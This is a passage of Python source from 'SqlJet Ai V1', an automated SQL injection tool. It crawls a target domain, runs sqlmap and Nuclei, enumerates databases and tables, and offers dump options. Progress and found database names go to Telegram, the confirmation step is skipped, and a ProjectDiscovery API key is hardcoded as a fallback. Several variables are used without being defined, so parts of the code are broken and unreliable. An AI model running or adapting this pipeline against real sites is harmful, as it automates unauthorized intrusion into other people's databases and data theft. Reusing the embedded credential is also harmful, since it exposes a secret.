         critical("Cannot find sqlmap executable.")
         send_telegram("Error: Cannot find sqlmap executable.")
         return {"vulnerable_found": False, "vulnerable_urls": []}
    
    return {"vulnerable_found": vulnerable_found, "vulnerable_urls": vulnerable_urls}


def run_dbs_enum(vulnerable_urls_file, output_dir, tamper_scripts=None, level=1, risk=1,
                  prefix=None, suffix=None, auth_type=None, auth_cred=None, cookie=None,
                  proxy=None, proxy_file=None, threads=5, verbose=False, return_dbs=False):
    """
    Run automatic database enumeration on vulnerable URLs
    
    Args:
        vulnerable_urls_file: File with list of vulnerable URLs
        output_dir: Directory to store results
        Other parameters match those in scan_with_sqlmap
    """
    header("AUTOMATIC DATABASE ENUMERATION")
    
    # Create a results subdirectory for database enumeration
    dbs_output_dir = os.path.join(output_dir, "database_enum")
    os.makedirs(dbs_output_dir, exist_ok=True)
    
    # Count the number of URLs to process
    with open(vulnerable_urls_file, 'r') as f:
        url_count = sum(1 for _ in f)
    
    info(f"Starting database enumeration on {url_count} vulnerable URLs...")
    send_telegram(f"Starting automatic database enumeration on {url_count} vulnerable URLs.")
    
    # Build sqlmap command for database enumeration using absolute path
    cmd = [TOOL_PATHS["sqlmap"], "-m", vulnerable_urls_file, "--batch", "--dbs"]
    
    # Add options
    if level: cmd.extend(["--level", str(level)])
    if risk: cmd.extend(["--risk", str(risk)])
    if threads: cmd.extend(["--threads", str(threads)])
    if tamper_scripts: cmd.extend(["--tamper", tamper_scripts])
    if prefix: cmd.extend(["--prefix", prefix])
    if suffix: cmd.extend(["--suffix", suffix])
    if auth_type and auth_cred:
        cmd.extend(["--auth-type", auth_type])
        cmd.extend(["--auth-cred", auth_cred])
    if cookie: cmd.extend(["--cookie", cookie])
    if proxy: cmd.extend(["--proxy", proxy])
    if proxy_file: cmd.extend(["--proxy-file", proxy_file])
    if verbose: cmd.extend(["-v"])
    
    # Add output directory
    cmd.extend(["--output-dir", dbs_output_dir])
    
    # Run sqlmap with real-time output
    info(f"Running database enumeration command: {' '.join(cmd)}")
    info(f"Output will be saved to: {dbs_output_dir}")
    
    stdout, stderr, return_code = run_command(cmd, show_output=True)
    if return_code != 0:
        error(f"Database enumeration failed.")
        send_telegram(f"Database enumeration failed.")
        return
    
    # Check for found databases
    dbs_found = []
    for d in os.listdir(dbs_output_dir):
        if os.path.isdir(os.path.join(dbs_output_dir, d)):
            # Exclude output directory itself and common non-db directories
            if d not in ["output", "scans", "logs"]:
                dbs_found.append(d)
    
    # Save the list of found databases
    dbs_file = os.path.join(dbs_output_dir, "databases.txt")
    with open(dbs_file, 'w') as f:
        for db in dbs_found:
            f.write(f"{db}\n")
    
    success(f"Database enumeration completed successfully!")
    success(f"Results saved to {dbs_output_dir}")
    
    if dbs_found:
        print("\n[+] Databases found:")
        for i, db in enumerate(dbs_found, 1):
            print(f"{Fore.GREEN}    {i}. {db}{Style.RESET_ALL}")
        success(f"Database list saved to {dbs_file}")
        
        send_telegram(f"Database enumeration completed! Found {len(dbs_found)} databases: {', '.join(dbs_found)}")
        
        # If tables were found, try to enumerate tables for each database
        if len(dbs_found) > 0 and not return_dbs:
            for db in dbs_found:
                enum_tables_for_db(vulnerable_urls_file, output_dir, db, tamper_scripts, level, risk,
                               prefix, suffix, auth_type, auth_cred, cookie, proxy, proxy_file, threads, verbose)
    else:
        warning("No databases were found or enumeration was incomplete.")
        send_telegram("Database enumeration completed, but no databases were found.")
    
    if return_dbs:
        return dbs_found


def enum_tables_for_db(vulnerable_urls_file, output_dir, db_name, tamper_scripts=None, level=1, risk=1,
                  prefix=None, suffix=None, auth_type=None, auth_cred=None, cookie=None,
                  proxy=None, proxy_file=None, threads=5, verbose=False):
    """
    Enumerate tables for a specific database
    
    Args:
        vulnerable_urls_file: File with list of vulnerable URLs
        output_dir: Directory to store results
        db_name: Name of the database to enumerate tables for
        Other parameters match those in scan_with_sqlmap
    """
    header(f"ENUMERATING TABLES FOR DATABASE: {db_name}")
    
    # Create a results subdirectory for table enumeration
    tables_output_dir = os.path.join(output_dir, "database_enum", db_name, "tables")
    os.makedirs(tables_output_dir, exist_ok=True)
    
    info(f"Starting table enumeration for database: {db_name}")
    send_telegram(f"Starting table enumeration for database: {db_name}")
    
    # Build sqlmap command for table enumeration using absolute path
    cmd = [TOOL_PATHS["sqlmap"], "-m", vulnerable_urls_file, "--batch", "--tables"]
    
    # Add database
    cmd.extend(["-D", db_name])
    
    # Add options
    if level: cmd.extend(["--level", str(level)])
    if risk: cmd.extend(["--risk", str(risk)])
    if threads: cmd.extend(["--threads", str(threads)])
    if tamper_scripts: cmd.extend(["--tamper", tamper_scripts])
    if prefix: cmd.extend(["--prefix", prefix])
    if suffix: cmd.extend(["--suffix", suffix])
    if auth_type and auth_cred:
        cmd.extend(["--auth-type", auth_type])
        cmd.extend(["--auth-cred", auth_cred])
    if cookie: cmd.extend(["--cookie", cookie])
    if proxy: cmd.extend(["--proxy", proxy])
    if proxy_file: cmd.extend(["--proxy-file", proxy_file])
    if verbose: cmd.extend(["-v"])
    
    # Add output directory
    cmd.extend(["--output-dir", tables_output_dir])
    
    # Run sqlmap with real-time output
    info(f"Running table enumeration command: {' '.join(cmd)}")
    info(f"Output will be saved to: {tables_output_dir}")
    
    stdout, stderr, return_code = run_command(cmd, show_output=True)
    if return_code != 0:
        error(f"Table enumeration failed.")
        send_telegram(f"Table enumeration for {db_name} failed.")
        return
    
    # Parse output to find tables
    tables_found = []
    try:
        # Extract tables from directory structure or output
        tables_file = os.path.join(tables_output_dir, "tables.txt")
        tables_content = stdout
        
        # Parse tables from output
        table_section = False
        for line in tables_content.split('\n'):
            if db_name.lower() in line.lower() and 'tables:' in line.lower():
                table_section = True
                continue
            
            if table_section and line.strip() and not line.startswith('['):
                # This is likely a table name
                table_name = line.strip()
                if table_name not in tables_found:
                    tables_found.append(table_name)
            
            # End table section when we hit a blank line
            if table_section and not line.strip():
                table_section = False
        
        # Save tables to file
        with open(tables_file, 'w') as f:
            for table in tables_found:
                f.write(f"{table}\n")
        
        if tables_found:
            success(f"Found {len(tables_found)} tables in database {db_name}")
            print("\n[+] Tables found:")
            for i, table in enumerate(tables_found, 1):
                print(f"{Fore.GREEN}    {i}. {table}{Style.RESET_ALL}")
            success(f"Table list saved to {tables_file}")
            
            send_telegram(f"Table enumeration completed for database {db_name}! Found {len(tables_found)} tables.")
            
            # Optionally, continue to enumerate columns for each table
            # This could be expanded in a future enhancement
        else:
            warning(f"No tables found in database {db_name} or enumeration was incomplete.")
            send_telegram(f"Table enumeration completed for database {db_name}, but no tables were found.")
    except Exception as e:
        error(f"Error parsing table enumeration results: {e}")

def update_tools():
    """
    Update all required Go-based tools using 'go install' command and Python dependencies
    """
    print(f"{Fore.CYAN}[*] Updating required tools...{Style.RESET_ALL}")
    
    go_tools = {
        "subfinder": "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        "httpx": "github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "katana": "github.com/projectdiscovery/katana/cmd/katana@latest",
        "gau": "github.com/lc/gau/v2/cmd/gau@latest",
        "nuclei": "github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
        "waybackurls": "github.com/tomnomnom/waybackurls@latest"
    }
    
    success_count = 0
    failed_tools = []
    
    for tool_name, repo_path in go_tools.items():
        print(f"{Fore.CYAN}[*] Updating {tool_name}...{Style.RESET_ALL}")
        try:
            result = subprocess.run(["go", "install", repo_path], 
                                   capture_output=True, 
                                   text=True, 
                                   check=False)
            
            if result.returncode == 0:
                success_count += 1
                print(f"{Fore.GREEN}[+] Successfully updated {tool_name}{Style.RESET_ALL}")
            else:
                failed_tools.append(tool_name)
                print(f"{Fore.RED}[!] Failed to update {tool_name}: {result.stderr}{Style.RESET_ALL}")
        except Exception as e:
            failed_tools.append(tool_name)
            print(f"{Fore.RED}[!] Error updating {tool_name}: {str(e)}{Style.RESET_ALL}")
    
    # Also update pip packages
    print(f"{Fore.CYAN}[*] Updating Python dependencies...{Style.RESET_ALL}")
    try:
        subprocess.run(["pip", "install", "-r", "requirements.txt", "--upgrade"], 
                       capture_output=True, 
                       text=True, 
                       check=False)
        print(f"{Fore.GREEN}[+] Successfully updated Python dependencies{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error updating Python dependencies: {str(e)}{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}[+] Update complete! Updated {success_count}/{len(go_tools)} tools successfully.{Style.RESET_ALL}")
    if failed_tools:
        print(f"{Fore.YELLOW}[!] Failed to update: {', '.join(failed_tools)}{Style.RESET_ALL}")


def main():
    # Initialize argument parser
    parser = argparse.ArgumentParser(description='SqlJet Ai V1 - Advanced SQL Injection Discovery & Testing Tool')
    
    # Basic options
    parser.add_argument("-u", "--url", help="Target domain or URL")
    parser.add_argument("-l", "--list", help="File containing list of URLs")
    parser.add_argument("-o", "--output", help="Output directory")
    parser.add_argument("-up", "--update", action="store_true", help="Update all required tools")
    parser.add_argument('--katana', action='store_true', default=True, help='Use Katana crawler to find potential SQL injection points')
    parser.add_argument('--katana-depth', type=int, default=3, help='Katana crawler depth (default: 3)')
    parser.add_argument('--katana-timeout', type=int, default=300, help='Katana crawler timeout in seconds (default: 300)')
    parser.add_argument('--skip-recon', action='store_true', help='Skip reconnaissance phase')
    parser.add_argument('--max-urls', type=int, help='Maximum number of URLs to scan')
    parser.add_argument('--vulnerable-file', help='File containing already discovered vulnerable URLs')
    
    # Enhanced scanning options
    parser.add_argument('--full', action='store_true', help='Run full scan with all enhanced features')
    parser.add_argument('--api-scan', action='store_true', help='Scan for API endpoints')
    parser.add_argument('--login-scan', action='store_true', help='Scan for login forms')
    parser.add_argument('--post-scan', action='store_true', help='Generate and test POST requests')
    parser.add_argument('--js-scan', action='store_true', help='Extract endpoints from JavaScript files')
    
    # SQLMap options
    parser.add_argument('--level', type=int, default=1, help='SQLMap detection level (1-5)')
    
    # AI integration options
    parser.add_argument('--ai', action='store_true', help='Enable AI-enhanced scanning for better SQL injection detection')
    parser.add_argument('--ai-model', default='gpt-4', choices=['gpt-4', 'gpt-3.5-turbo'], help='AI model to use for analysis')
    parser.add_argument('--ai-key', help='OpenAI API key (can also be set via OPENAI_API_KEY environment variable)')
    parser.add_argument('--store-ai-key', action='store_true', help='Securely store the provided API key for future use')
    parser.add_argument('--ai-analyze-only', action='store_true', help='Only analyze target without performing actual injection tests')
    parser.add_argument('--disable-ssl-verify', action='store_true', help='Disable SSL certificate verification (useful for sites with invalid/expired certificates)')
    parser.add_argument('--nuclei', action='store_true', help='Use Nuclei with AI-powered detection for enhanced SQL injection scanning')
    parser.add_argument('--pdcp-api-key', help='ProjectDiscovery API key for Nuclei AI scanning (can also be set via PDCP_API_KEY env var)')
    parser.add_argument('--nuclei-katana', action='store_true', help='Run Nuclei AI scans on Katana crawler output for deeper vulnerability detection')
    parser.add_argument('--risk', type=int, default=1, help='SQLMap risk level (1-3)')
    parser.add_argument('--tamper', help='SQLMap tamper script(s)')
    parser.add_argument('--threads', type=int, default=10, help='Number of concurrent threads')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--prefix', help='Injection payload prefix')
    parser.add_argument('--suffix', help='Injection payload suffix')
    parser.add_argument('--auto-waf', action='store_true', help='Auto-detect WAF and use appropriate tamper scripts')
    
    # Authentication options
    parser.add_argument('--auth-type', help='HTTP authentication type (Basic, Digest, NTLM)')
    parser.add_argument('--auth-cred', help='HTTP authentication credentials (user:pass)')
    parser.add_argument('--cookie', help='HTTP Cookie header')
    
    # Proxy options
    parser.add_argument('--proxy', help='Proxy URL (http(s)://host:port)')
    parser.add_argument('--proxy-file', help='File containing a list of proxies')
    parser.add_argument('--headers', help='Extra headers')
    
    # Data extraction options
    parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
    parser.add_argument('--tables', action='store_true', help='Enumerate tables')
    parser.add_argument('--columns', action='store_true', help='Enumerate columns')
    parser.add_argument('--dump', action='store_true', help='Dump table contents')
    
    # Output options
    parser.add_argument('--report', help='Output report format (csv, html, etc.)')
    parser.add_argument('--timeout', type=int, help='Timeout for requests (seconds)')
    
    # Show help if no arguments are provided
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)
        
    # Parse arguments
    args = parser.parse_args()
    
    # Debug output
    print("DEBUG: Arguments parsed successfully")
    
    # Initialize colorama
    init(autoreset=True)
    print("DEBUG: Colorama initialized")
    
    # Handle tool updates if requested
    if args.update:
        update_tools()
        sys.exit(0)
    
    # Validate arguments
    if not args.url and not args.vulnerable_file:
        print("[ERROR] You must specify either a target domain/URL (-u/--url) or a file with vulnerable URLs (--vulnerable-file)")
        sys.exit(1)
        
    # Fix domain variable name mismatch
    domain = args.url if args.url else None
        
    # Check if this is a simple one-command scan
    is_integrated_scan = domain and not (args.vulnerable_file or args.skip_recon)
    
    # For full scan mode, enable all enhanced features
    if args.full:
        args.api_scan = True
        args.login_scan = True
        args.post_scan = True
        args.js_scan = True
        args.auto_waf = True
        args.dbs = True

    # Set up output directory
    if domain:
        domain_clean = domain.replace('https://', '').replace('http://', '').split('/')[0]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = args.output or os.path.join(RESULTS_BASE_DIR, f"{domain_clean}_{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        print(f"[*] Starting Scan for: {domain_clean}")
        print(f"[*] Results directory: {output_dir}")
    else:
        # Direct scan mode from vulnerable file - use a generic name
        domain_clean = "direct-scan"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = args.output or os.path.join(RESULTS_BASE_DIR, f"{domain_clean}_{timestamp}")
        os.makedirs(output_dir, exist_ok=True)
        print(f"[*] Starting Scan for: {domain_clean}")
        print(f"[*] Results directory: {output_dir}")
        
    # Run the integrated scanning mode if this is a simple command (-u domain.com)
    if is_integrated_scan or args.api_scan or args.js_scan or args.login_scan or args.post_scan or args.katana:
        try:
            # Import the integrated scanner
            from integrated_scan import run_integrated_scan
            import ai_integration
            import nuclei_integration
            
            # Display banner and disclaimer without asking for confirmation
            display_banner()
            print("="*60)
            print(" SqlJet Ai V1 - DISCLAIMER")
            print(" SqlJet Ai is an open source penetration testing tool that")
            print(" automates the process of detecting and exploiting SQL injection.")
            print(" This tool is for educational purposes only.")
            print(" The developer is not responsible for any illegal use!")
            print(" Ensure you have explicit permission to test the target domain!")
            print(" Unauthorized testing may be illegal in your jurisdiction.")
            print("="*60)
            print(f"{Fore.GREEN}[+] Running in fully automatic mode{Style.RESET_ALL}")
            
            # Check if required tools are installed
            success, missing_tools = check_tools(skip_recon=args.skip_recon)
            if not success:
                sys.exit(1)
                
            # Run the integrated scan
            results = run_integrated_scan(args, output_dir)
            sys.exit(0)
        except ImportError as e:
            print(f"[ERROR] Failed to import integrated scanning module: {e}")
            print("[*] Falling back to standard scanning mode...")
    print(f"[*] Results directory: {output_dir}")
    
    # Check if we should use the comprehensive integrated workflow
    if args.full:
        try:
            print(f"{Fore.CYAN}[*] Preparing to run comprehensive scan with integrated workflow{Style.RESET_ALL}")
            
            # Add traceback for uncaught exceptions
            import traceback
            def exception_handler(exc_type, exc_value, exc_traceback):
                print(f"{Fore.RED}[ERROR] Unhandled exception:{Style.RESET_ALL}")
                traceback.print_exception(exc_type, exc_value, exc_traceback)
            sys.excepthook = exception_handler
            
            # Import the integrated workflow module
            print(f"{Fore.CYAN}[*] Loading workflow module...{Style.RESET_ALL}")
            from integrated_workflow import IntegratedWorkflow
            
            print(f"{Fore.CYAN}============================================================")
            print(f"   STARTING COMPREHENSIVE SQL INJECTION SCAN")
            print(f"============================================================{Style.RESET_ALL}")
            
            print(f"{Fore.CYAN}[*] Preparing workflow configuration...{Style.RESET_ALL}")
            # Define tool paths
            TOOL_PATHS = {
                "subfinder": "subfinder",
                "httpx": "httpx",
                "sqlmap": "sqlmap",
                "gau": "gau",
                "katana": "katana",
                "nuclei": "nuclei",
                "waybackurls": "waybackurls"
            }
            
            # Get API keys
            openai_key = os.environ.get("OPENAI_API_KEY")
            pdcp_api_key = os.environ.get("PDCP_API_KEY", "caaece17-b50e-4270-8035-62c674979488")
            
            print(f"{Fore.CYAN}[*] Creating workflow for domain: {domain_clean}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Output directory: {output_dir}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] API Keys - OpenAI: {'Configured' if openai_key else 'Not configured'}, PDCP: {'Configured' if pdcp_api_key else 'Not configured'}{Style.RESET_ALL}")
            
            # Create the workflow instance
            try:
                workflow = IntegratedWorkflow(
                    domain=domain_clean,
                    output_dir=output_dir,
                    tool_paths=TOOL_PATHS,
                    verify_ssl=not args.disable_ssl_verify if hasattr(args, 'disable_ssl_verify') else True,
                    openai_key=openai_key,
                    pdcp_api_key=pdcp_api_key,
                    verbose=args.verbose if hasattr(args, 'verbose') else False,
                    sqli_level=args.level if hasattr(args, 'level') else 3,
                    risk_level=args.risk if hasattr(args, 'risk') else 2
                )
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to initialize workflow: {e}{Style.RESET_ALL}")
                traceback.print_exc()
                sys.exit(1)
            print(f"{Fore.GREEN}[+] Workflow instance created successfully{Style.RESET_ALL}")
            
            print(f"{Fore.CYAN}============================================================")
            print(f"   STARTING COMPREHENSIVE SQL INJECTION SCAN")
            print(f"============================================================{Style.RESET_ALL}")
            
            print(f"{Fore.CYAN}[*] Starting the comprehensive SQL injection workflow{Style.RESET_ALL}")
            
            # Call the run_full_workflow method which executes all steps in sequence
            workflow.run_full_workflow()
            
            print(f"{Fore.GREEN}[+] Comprehensive workflow completed{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Results saved to: {output_dir}{Style.RESET_ALL}")
            
            print(f"{Fore.GREEN}[+] Comprehensive scan completed successfully!{Style.RESET_ALL}")
            
            # Exit the script after the workflow is complete
            sys.exit(0)
        except ImportError as e:
            print(f"{Fore.RED}[ERROR] Failed to import integrated workflow module: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Falling back to standard scanning mode...{Style.RESET_ALL}")
            # Print Python path for debugging
            print(f"{Fore.YELLOW}[DEBUG] Python path: {sys.path}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] An error occurred in the integrated workflow: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            print(f"{Fore.YELLOW}[*] Falling back to standard scanning mode...{Style.RESET_ALL}")
    
    # Skip confirmation in automatic mode
    print(f"{Fore.GREEN}[+] Running in fully automatic mode{Style.RESET_ALL}")
    
    # Initialize url_count to avoid the NameError later
    url_count = 0
        
    # Verify required tools
    tools_ok, missing_tools = check_tools(skip_recon=args.skip_recon)
    if not tools_ok:
        sys.exit(1)
    
    # Determine which mode to run in
    if args.vulnerable_file:
        # Direct scan mode - use provided vulnerable URLs file
        header("DIRECT SCAN MODE")
        success(f"Using provided vulnerable URLs file: {args.vulnerable_file}")
        
        # Copy the file to our results directory
        live_params_urls_file = os.path.join(output_dir, "vulnerable_urls.txt")
        shutil.copy(args.vulnerable_file, live_params_urls_file)
        
        # Count the number of URLs
        with open(live_params_urls_file, 'r') as f:
            url_count = sum(1 for _ in f)
        
        info(f"Loaded {url_count} potentially vulnerable URLs for testing")
        
        # Skip recon process and proceed directly to SQLMap testing
        send_telegram(f"Starting direct SQL injection test on {url_count} URLs from {args.vulnerable_file}")
        
    elif args.skip_recon:
        # Skip recon and use existing files
        print("[*] Skipping reconnaissance (--skip-recon flag set)")
        
        # Define expected files
        subdomains_file = os.path.join(output_dir, "subdomains.txt")
        all_urls_file = os.path.join(output_dir, "all_urls.txt")
        filtered_params_urls_file = os.path.join(output_dir, "filtered_params_urls.txt")
        live_params_urls_file = os.path.join(output_dir, "live_params_urls.txt")
        
        # Check if the required files exist
        if not os.path.exists(filtered_params_urls_file) or not os.path.exists(live_params_urls_file):
            print("[ERROR] --skip-recon set but no existing URL file found. Cannot continue.")
            sys.exit(1)
        
        # Update our filtered_urls_file reference
        filtered_urls_file = limited_urls_file
        url_count = args.max_urls
        
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Limited scan to {args.max_urls} URLs\n")

    # Direct scan mode skips URL checking
    if args.vulnerable_file:
        # For direct scan, we already have the URLs file
        live_count = url_count
        scan_start_time = time.time()  # Define scan_start_time here
        notify_msg = f"Starting SQLMap scans on {live_count} provided URLs for {domain_clean}."
        log_file = os.path.join(output_dir, "scan.log")
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Direct scan with {live_count} URLs\n")
        send_telegram(notify_msg, log_file)
        
        # For direct scan, proceed to SQLMap immediately
        header("SQL INJECTION TESTING PHASE")
        
        # Check if Nuclei scan is requested
        verify_ssl = not args.disable_ssl_verify
        nuclei_results = None
        
        if args.nuclei:
            header("RUNNING NUCLEI AI-POWERED SQL INJECTION SCAN")
            pdcp_api_key = args.pdcp_api_key or os.environ.get("PDCP_API_KEY")
            # Make sure nuclei_integration module is imported
            try:
                import nuclei_integration
                success("Nuclei integration loaded successfully")
            except ImportError as e:
                error(f"Failed to import nuclei_integration module: {e}")
                warning("Please ensure nuclei_integration.py is in the same directory")
                warning("Continuing with standard scan without Nuclei")
                args.nuclei = False  # Disable nuclei flag since it can't be loaded
            
            if not pdcp_api_key and args.nuclei:
                warning("No ProjectDiscovery API key provided. Set via --pdcp-api-key or PDCP_API_KEY environment variable.")
                warning("Continuing without API key. Some Nuclei AI features may be limited.")
            
            if args.nuclei:  # Only proceed if we still have nuclei enabled
                nuclei = nuclei_integration.NucleiIntegration(
                    api_key=pdcp_api_key,
                    output_dir=output_dir,
                    verify_ssl=not getattr(args, 'disable_ssl_verify', False),
                    debug=args.verbose,
                    nuclei_path=TOOL_PATHS["nuclei"],
                    katana_path=TOOL_PATHS["katana"]
                )
                
                # Check if Nuclei is installed
                if not nuclei.check_nuclei_installation():
                    warning("Nuclei is not installed or not found in PATH")
                    warning("Install Nuclei with: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
                    warning("Continuing with standard scan without Nuclei")
                    args.nuclei = False
                else:
                    success("Nuclei is installed and ready to use")
                
                # Run nuclei on Katana output if requested
                if args.nuclei_katana and katana_output_file and os.path.exists(katana_output_file):
                    info(f"Running Nuclei AI-powered scan on Katana crawler output")
                    nuclei_results = nuclei.scan_katana_output(
                        katana_file=katana_output_file,
                        output_file=os.path.join(output_dir, "nuclei_katana_results.json")
                    )
                else:
                    # Run nuclei directly on the target
                    info(f"Running Nuclei AI-powered scan directly on target: {args.domain}")
                    nuclei_results = nuclei.find_sql_injections(
                        target=args.domain,
                        output_file=os.path.join(output_dir, "nuclei_sqli_results.json")
                    )
                
                if nuclei_results and nuclei_results.get("sql_injection_found", False):
                    header("NUCLEI SQL INJECTION VULNERABILITIES DETECTED")
                    print(f"{Fore.RED}{Style.BRIGHT}{'='*80}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}{'VULNERABILITY':<80}{Style.RESET_ALL}")
                    print(f"{Fore.RED}{Style.BRIGHT}{'='*80}{Style.RESET_ALL}")
                    
                    for vuln in nuclei_results.get("vulnerabilities", []):
                        vulnerable(vuln)
                        
                    # Save vulnerable URLs to file for sqlmap
                    if live_params_urls_file:
                        # Create new file with only Nuclei-discovered vulnerabilities
                        with open(live_params_urls_file, 'w') as f:
                            for vuln in nuclei_results.get("vulnerabilities", []):
                                url_match = re.search(r'\[([^\]]+)\]', vuln)
                                if url_match:
                                    url = url_match.group(1)
                                    f.write(f"{url}\n")
                        success(f"Created new target file with {len(nuclei_results.get('vulnerabilities', []))} Nuclei-discovered vulnerable URLs")
        
        # Direct SQLMap scan with SQLJet
        sqlmap_result = scan_with_sqlmap(
            live_params_urls_file,
            output_dir,
            tamper_scripts=args.tamper,
            level=args.level,
            risk=args.risk,
            prefix=args.prefix,
            suffix=args.suffix,
            auth_type=args.auth_type,
            auth_cred=args.auth_cred,
            cookie=args.cookie,
            proxy=args.proxy,
            proxy_file=args.proxy_file,
            headers=args.headers,
            get_dbs=args.dbs,
            get_tables=args.tables,
            get_columns=args.columns,
            dump_data=args.dump,
            threads=args.threads,
            verbose=args.verbose,
            auto_waf=args.auto_waf,
            report_format=args.report,
            timeout=args.timeout,
            auto_enum_dbs=True
        )
        sqlmap_end = time.time()
        sqlmap_duration = sqlmap_end - sqlmap_start
        
        # Generate scan summary
        summary_file = os.path.join(output_dir, "scan_summary.txt")
        with open(summary_file, 'w') as f:
            f.write(f"SqlQ Scan Summary for {domain_clean}\n")
            f.write(f"{'='*50}\n")
            f.write(f"Scan started at: {datetime.fromtimestamp(scan_start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total scan duration: {(time.time() - scan_start_time)/60:.2f} minutes\n\n")
            
            f.write(f"Direct scan mode: Used {live_count} provided URLs\n")
            f.write(f"SQLMap scan duration: {sqlmap_duration/60:.2f} minutes\n\n")
            
            f.write(f"WAF Detection: {'Enabled' if args.auto_waf else 'Disabled'}\n")
            if args.tamper:
                f.write(f"User-specified tamper scripts: {args.tamper}\n")
                
            f.write(f"\nResults saved to: {output_dir}\n")
        
        scan_end_time = time.time()
        duration_mins = (scan_end_time - scan_start_time) / 60
        
        print(f"\n[COMPLETE] SQL Injection scan completed in {duration_mins:.2f} minutes.")
        print(f"Results saved to {output_dir}")
        print(f"Scan summary saved to {summary_file}")
        
        # Final notification
        completion_msg = f"Scan completed for {domain_clean} in {duration_mins:.2f} minutes. Check {output_dir} for results."
        send_telegram(completion_msg, log_file)
        
        # Exit after direct scan is complete
        sys.exit(0)
    elif url_count > 0:
        # Check which URLs are live (standard flow)
        live_count = check_live_urls(filtered_urls_file, live_urls_file)
        with open(log_file, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Found {live_count} live URLs with parameters\n")
        
        if live_count > 0:
            # Notify about starting SQLMap scan
            notify_msg = f"Found {live_count} live URLs with parameters for {domain_clean}. Starting SQLMap scans now."
            send_telegram(notify_msg, log_file)
            
            # Run SQLMap scan
            sqlmap_start = time.time()
            scan_results = scan_with_sqlmap(
                live_params_urls_file if args.vulnerable_file else live_urls_file,
                results_dir,
                tamper_scripts=args.tamper,
                level=args.level,
                risk=args.risk,
                prefix=args.prefix,
                suffix=args.suffix,
                auth_type=args.auth_type,
                auth_cred=args.auth_cred,
                cookie=args.cookie,
                proxy=args.proxy,
                proxy_file=args.proxy_file,
                headers=args.headers,
                get_dbs=args.dbs,
                get_tables=args.tables,
                get_columns=args.columns,
                dump_data=args.dump,
                threads=args.threads,
                verbose=args.verbose,
                auto_waf=args.auto_waf,
                report_format=args.report,
                timeout=args.timeout,
                auto_enum_dbs=True
            )
            sqlmap_end = time.time()
            sqlmap_duration = sqlmap_end - sqlmap_start
            
            # Generate scan summary
            with open(summary_file, 'w') as f:
                f.write(f"SqlQ Scan Summary for {domain_clean}\n")
                f.write(f"{'='*50}\n")
                f.write(f"Scan started at: {datetime.fromtimestamp(scan_start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total scan duration: {(time.time() - scan_start_time)/60:.2f} minutes\n\n")
                
                f.write(f"Subdomain enumeration: {sum(1 for _ in open(subdomain_file))} subdomains found\n")
                f.write(f"URL analysis: {url_count} URLs with parameters found\n")
                f.write(f"Live URLs: {live_count} URLs were accessible\n")
                f.write(f"SQLMap scan duration: {sqlmap_duration/60:.2f} minutes\n\n")
                
                f.write(f"WAF Detection: {'Enabled' if args.auto_waf else 'Disabled'}\n")
                if args.tamper:
                    f.write(f"User-specified tamper scripts: {args.tamper}\n")
                    
                f.write(f"\nResults saved to: {results_dir}\n")
            
            scan_end_time = time.time()
            duration_mins = (scan_end_time - scan_start_time) / 60
            
            print(f"\n[COMPLETE] SQL Injection scan completed in {duration_mins:.2f} minutes.")
            print(f"Results saved to {results_dir}")
            print(f"Scan summary saved to {summary_file}")
            
            # Final notification
            completion_msg = f"Scan completed for {domain_clean} in {duration_mins:.2f} minutes. Check {results_dir} for results."
            send_telegram(completion_msg, log_file)
        else:
            msg = f"Scan completed for {domain_clean}, but no live URLs with parameters were found."
            print(f"[-] {msg}")
            send_telegram(msg)
    else:
        msg = f"Scan completed for {domain_clean}, but no URLs with parameters were found."
        print(f"[-] {msg}")
        send_telegram(msg)

def run_sql_scan(args, output_dir):
    """Run a SQL injection scan with the provided arguments
    
    Args:
        args: The parsed command line arguments
        output_dir: The output directory for results
        
    Returns:
        dict: Results of the scan
    """
    # Initialize colorama
    init(autoreset=True)
    
    # Check if this is a simple one-command scan
    domain = args.url if hasattr(args, 'url') else None
    is_integrated_scan = domain and not (args.vulnerable_file or args.skip_recon)
    
    # Run the integrated scanning mode if this is a simple command (-u domain.com)
    if is_integrated_scan or args.api_scan or args.js_scan or args.login_scan or args.post_scan or args.katana:
        try:
            # Import the integrated scanner
            from integrated_scan import run_integrated_scan
            import ai_integration
            import nuclei_integration
            
            # Display banner and disclaimer without asking for confirmation
            display_banner()
            print("="*60)
            print(" SqlJet Ai V1 - DISCLAIMER")
            print(" SqlJet Ai is an open source penetration testing tool that")
            print(" automates the process of detecting and exploiting SQL injection.")
            print(" This tool is for educational purposes only.")
            print(" The developer is not responsible for any illegal use!")
            print(" Ensure you have explicit permission to test the target domain!")
            print(" Unauthorized testing may be illegal in your jurisdiction.")
            print("="*60)
